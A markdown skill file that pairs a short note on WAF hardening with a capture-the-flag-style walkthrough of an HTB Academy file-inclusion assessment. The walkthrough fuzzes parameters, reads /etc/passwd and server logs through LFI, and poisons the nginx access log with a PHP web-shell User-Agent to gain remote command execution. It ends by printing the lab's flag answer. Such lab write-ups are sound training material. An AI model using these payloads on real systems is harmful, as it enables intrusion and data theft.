---
name: gpt-fileinclusion
description: 'Skill: gpt-fileinclusion'
license: MIT
tags:
- general
---

## Web Application Firewall (WAF)

The universal way to harden applications is to utilize a Web Application Firewall (WAF), such as `ModSecurity`. When dealing with WAFs, the most important thing to avoid is false positives and blocking non-malicious requests. ModSecurity minimizes false positives by offering a `permissive` mode, which will only report things it would have blocked. This lets defenders tune the rules to make sure no legitimate request is blocked. Even if the organization never wants to turn the WAF to "blocking mode", just having it in permissive mode can be an early warning sign that your application is being attacked.

Finally, it is important to remember that the purpose of hardening is to give the application a stronger exterior shell, so when an attack does happen, the defenders have time to defend. According to the [FireEye M-Trends Report of 2020](https://content.fireeye.com/m-trends/rpt-m-trends-2020), the average time it took a company to detect hackers was 30 days. With proper hardening, attackers will leave many more signs, and the organization will hopefully detect these events even quicker.

It is important to understand the goal of hardening is not to make your system un-hackable, meaning you cannot neglect watching logs over a hardened system because it is "secure". Hardened systems should be continually tested, especially after a zero-day is released for a related application to your system (ex: Apache Struts, RAILS, Django, etc.). In most cases, the zero-day would work, but thanks to hardening, it may generate unique logs, which made it possible to confirm whether the exploit was used against the system or not.#lfi #hacking #walkthrough

# Labs - Skill Assessment

Scenario[](https://nukercharlie.gitbook.io/htb-academy-cpts/external-web/file-inclusion/labs-skill-assessment#scenario)

The company `INLANEFREIGHT` has contracted you to perform a web application assessment against one of their public-facing websites. They have been through many assessments in the past but have added some new functionality in a hurry and are particularly concerned about file inclusion/path traversal vulnerabilities.

They provided a target IP address and no further information about their website. Perform a full assessment of the web application checking for file inclusion and path traversal vulnerabilities.

Find a flag in the / root directory of the file system. Submit the contents of the flag as your answer.

Answers[](https://nukercharlie.gitbook.io/htb-academy-cpts/external-web/file-inclusion/labs-skill-assessment#answers)

Found parameter 'page' while browsing the site and by using the method below, also found a parameter 'message' by intercepting a request from the 'contact' page. Manually fuzzing both parameters for a LFI vulnerability did not lead anywhere:

┌──(kali㉿kali)-[~]

└─$ ffuf -ic -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://IP:PORT:30157/FUZZ.php

<SNIP>

index [Status: 200, Size: 15829, Words: 3435, Lines: 401, Duration: 151ms]

about [Status: 200, Size: 10313, Words: 2398, Lines: 214, Duration: 198ms]

contact [Status: 200, Size: 2714, Words: 773, Lines: 78, Duration: 198ms]

main [Status: 200, Size: 11507, Words: 2639, Lines: 284, Duration: 139ms]

industries [Status: 200, Size: 8082, Words: 2018, Lines: 197, Duration: 101ms]

error [Status: 200, Size: 199, Words: 41, Lines: 10, Duration: 96ms]

​

┌──(kali㉿kali)-[~]

└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://IP:PORT/index.php?FUZZ=value' -fs 15829

page [Status: 200, Size: 4322, Words: 797, Lines: 118, Duration: 106ms]

​

┌──(kali㉿kali)-[~]

└─$ ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://IP:PORT/index.php?page=FUZZ' -fs 4521,4322

​

┌──(kali㉿kali)-[~]

└─$ ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://IP:PORT/index.php?message=FUZZ' -fs 15829

Used tool

to discover LFI vulnerabilities:

┌──(kali㉿kali)-[~]

└─$ python lfimap.py -U 'http://IP:PORT/index.php?page=PWN'

[!] Cookie argument ('-C') is not provided. lfimap might have troubles finding vulnerabilities if web app requires a cookie.

[+] LFI -> 'http://IP:PORT/index.php?page=php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dindex'

----------------------------------------

Lfimap finished with execution.

Endpoints tested: 1

Requests sent: 61

Vulnerabilities found: 1

​

┌──(kali㉿kali)-[~]

└─$ python lfimap.py -U 'http://IP:PORT/index.php?message=PWN'

[!] Cookie argument ('-C') is not provided. lfimap might have troubles finding vulnerabilities if web app requires a cookie.

----------------------------------------

Lfimap finished with execution.

Endpoints tested: 1

Requests sent: 63

Vulnerabilities found: 0

Used the vulnerability to find a hidden page:

┌──(kali㉿kali)-[~]

└─$ curl http://IP:PORT/index.php?page=php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dindex

​

Decoded base64 value and found:

<a href="ilf_admin/index.php">Admin</a>

Navigated to `http://IP:PORT/ilf_admin/index.php` and found Admin panel with logs. Looked for LFI vuln on the 'log' parameter as well:

┌──(kali㉿kali)-[~]

└─$ python lfimap.py -U 'http://IP:PORT/ilf_admin/index.php?log=PWN'

[!] Cookie argument ('-C') is not provided. lfimap might have troubles finding vulnerabilities if web app requires a cookie.

[+] LFI -> 'http://142.93.40.191:31420/ilf_admin/index.php?log=etc/passwd'

----------------------------------------

Lfimap finished with execution.

Endpoints tested: 1

Requests sent: 35

Vulnerabilities found: 1

LFI vuln used to find server logs `/var/log/nginx/access.log`, `/var/log/nginx/error.log` (see Server Log Poisoning section in notes for more details on logs that could be poisoned or fuzz for files as shown below).

┌──(kali㉿kali)-[~]

└─$ ffuf -ic -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-WordList-Linux:FUZZ -u http://IP:PORT/ilf_admin/index.php?log=FUZZ -fs 2046

<SNIP>

/etc/ca-certificates.conf [Status: 200, Size: 7659, Words: 163, Lines: 242, Duration: 137ms]

/etc/fstab [Status: 200, Size: 2135, Words: 154, Lines: 104, Duration: 125ms]

/etc/group- [Status: 200, Size: 2761, Words: 150, Lines: 151, Duration: 124ms]

/etc/group [Status: 200, Size: 2766, Words: 150, Lines: 151, Duration: 145ms]

/etc/hosts [Status: 200, Size: 2280, Words: 155, Lines: 110, Duration: 134ms]

/etc/hostname [Status: 200, Size: 2084, Words: 150, Lines: 103, Duration: 135ms]

/etc/inittab [Status: 200, Size: 2616, Words: 196, Lines: 125, Duration: 143ms]

/etc/issue [Status: 200, Size: 2100, Words: 159, Lines: 105, Duration: 111ms]

/etc/modules [Status: 200, Size: 2061, Words: 150, Lines: 104, Duration: 100ms]

/etc/motd [Status: 200, Size: 2329, Words: 183, Lines: 112, Duration: 118ms]

/etc/mtab [Status: 200, Size: 5331, Words: 325, Lines: 137, Duration: 118ms]

/etc/nginx/nginx.conf [Status: 200, Size: 4965, Words: 934, Lines: 196, Duration: 107ms]

/etc/os-release [Status: 200, Size: 2210, Words: 153, Lines: 108, Duration: 104ms]

/etc/passwd- [Status: 200, Size: 3218, Words: 152, Lines: 129, Duration: 105ms]

/etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130, Duration: 106ms]

/etc/profile [Status: 200, Size: 2284, Words: 199, Lines: 112, Duration: 102ms]

/etc/resolv.conf [Status: 200, Size: 2152, Words: 155, Lines: 105, Duration: 102ms]

/etc/sysctl.conf [Status: 200, Size: 2099, Words: 157, Lines: 103, Duration: 104ms]

/proc/devices [Status: 200, Size: 2488, Words: 226, Lines: 150, Duration: 100ms]

/proc/cpuinfo [Status: 200, Size: 7518, Words: 826, Lines: 214, Duration: 100ms]

/proc/meminfo [Status: 200, Size: 3465, Words: 619, Lines: 153, Duration: 103ms]

/proc/self/cmdline [Status: 200, Size: 2064, Words: 152, Lines: 102, Duration: 103ms]

/proc/net/udp [Status: 200, Size: 2174, Words: 185, Lines: 103, Duration: 103ms]

/proc/net/tcp [Status: 200, Size: 64596, Words: 24715, Lines: 519, Duration: 105ms]

/proc/self/environ [Status: 200, Size: 61088, Words: 151, Lines: 102, Duration: 106ms]

/proc/self/mounts [Status: 200, Size: 5331, Words: 325, Lines: 137, Duration: 104ms]

/proc/self/stat [Status: 200, Size: 2357, Words: 201, Lines: 103, Duration: 101ms]

/proc/self/status [Status: 200, Size: 3393, Words: 242, Lines: 158, Duration: 102ms]

/proc/version [Status: 200, Size: 2235, Words: 169, Lines: 103, Duration: 105ms]

/var/log/nginx/access.log [Status: 200, Size: 812946, Words: 69256, Lines: 3941, Duration: 115ms]

/var/log/nginx/error.log [Status: 200, Size: 2711822, Words: 223611, Lines: 3726, Duration: 130ms]

Intercepted a request to the website using Burp Suite, and modified it with a basic PHP web shell:

GET / HTTP/1.1

Host: IP:PORT

Upgrade-Insecure-Requests: 1

User-Agent: <?php system($_GET['cmd']); ?>

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

Accept-Encoding: gzip, deflate

Accept-Language: en-US,en;q=0.9

Connection: close

​

OR

​

GET /<?php system($_GET['cmd']); ?> HTTP/1.1

Host: 138.68.155.111:32334

Upgrade-Insecure-Requests: 1

User-Agent: HACKED

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

Accept-Encoding: gzip, deflate

Accept-Language: en-US,en;q=0.9

Connection: close

Then got RCE by viewing the access logs:

http://IP:PORT/ilf_admin/index.php?log=var/log/nginx/access.log&cmd=cat /etc/passwd

http://IP:PORT/ilf_admin/index.php?log=var/log/nginx/access.log&cmd=ls -la /

<SNIP>

drwxr-xr-x 1 root root 4096 Mar 14 02:24 .

drwxr-xr-x 1 root root 4096 Mar 14 02:24 ..

drwxr-xr-x 2 root root 4096 May 29 2020 bin

drwxr-xr-x 5 root root 360 Mar 14 02:24 dev

drwxr-xr-x 1 root root 4096 Mar 14 02:24 etc

-rw-r--r-- 1 root root 33 Sep 9 2020 flag_dacc60f2348d.txt

drwxr-xr-x 2 root root 4096 May 29 2020 home

drwxr-xr-x 1 root root 4096 Sep 9 2020 lib

drwxr-xr-x 5 root root 4096 May 29 2020 media

drwxr-xr-x 2 root root 4096 May 29 2020 mnt

drwxr-xr-x 2 root root 4096 May 29 2020 opt

dr-xr-xr-x 438 root root 0 Mar 14 02:24 proc

drwx------ 2 root root 4096 May 29 2020 root

drwxr-xr-x 1 nobody nobody 4096 Mar 14 02:24 run

drwxr-xr-x 2 root root 4096 May 29 2020 sbin

drwxr-xr-x 2 root root 4096 May 29 2020 srv

dr-xr-xr-x 13 root root 0 Mar 14 02:24 sys

drwxrwxrwt 1 root root 4096 Mar 14 02:24 tmp

drwxr-xr-x 1 root root 4096 Sep 9 2020 usr

drwxr-xr-x 1 root root 4096 Sep 9 2020 var

​

http://IP:PORT/ilf_admin/index.php?log=var/log/nginx/access.log&cmd=cat /flag_dacc60f2348d.txt

a9a892dbc9faf9a014f58e007721835e

**Answer:** `**a9a892dbc9faf9a014f58e007721835e**`
